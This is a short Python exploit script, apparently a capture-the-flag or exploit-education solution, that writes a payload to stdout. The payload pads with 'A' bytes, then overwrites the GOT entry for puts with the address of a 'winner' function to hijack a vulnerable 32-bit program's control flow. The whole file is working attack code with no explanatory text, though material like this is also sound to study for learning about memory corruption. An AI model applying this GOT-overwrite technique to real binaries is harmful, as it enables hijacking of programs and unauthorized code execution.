#!/usr/bin/env python
import sys

injection_point = 0x804B1D0
winner_addr = 0x80484B6
puts_got = 0x0804A018
offset = 8 + 8 + 4  # pad + header + pad

payload = b""
payload += b"A" * offset
payload += puts_got.to_bytes(4, "little")
payload += b" "
payload += winner_addr.to_bytes(4, "little")

sys.stdout.buffer.write(payload)
